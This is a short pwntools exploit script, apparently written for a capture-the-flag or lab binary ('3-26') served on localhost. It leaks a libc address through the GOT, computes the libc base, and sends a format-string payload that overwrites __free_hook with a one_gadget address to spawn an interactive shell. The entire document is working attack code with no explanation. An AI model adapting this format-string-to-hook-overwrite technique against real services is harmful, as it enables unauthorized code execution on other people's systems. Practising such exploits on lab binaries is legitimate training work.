from pwn import *
binary=ELF('./3-26')
libc=ELF('/lib/i386-linux-gnu/libc.so.6')
env = {'LD_PRELOAD':'/lib/i386-linux-gnu/libc.so.6'}
libc.symbols['one_gadget']=0x6709e
read_got = 0x8049fc4
r=remote('127.0.0.1',8888)
#r=process('./3-26',env=env)
sleep(4);
print r.recvline();
r.sendline(str(read_got))
data=r.recv();
read_addr = int(data[:11],16)
print hex(read_addr)
libc.address = read_addr - libc.symbols['read']
log.critical('libc_base: ' + hex(libc.address))
log.critical('__free_hook: ' + hex(libc.symbols['__free_hook']))
log.critical('one gadget: ' + hex(libc.symbols['one_gadget']))
print r.recvrepeat(3)
gdb.attach(r)
raw_input("hellowpwn")
r.sendline(fmtstr_payload( 7, { libc.symbols['__free_hook']: libc.symbols['one_gadget'] }) + '%10000c')
r.interactive()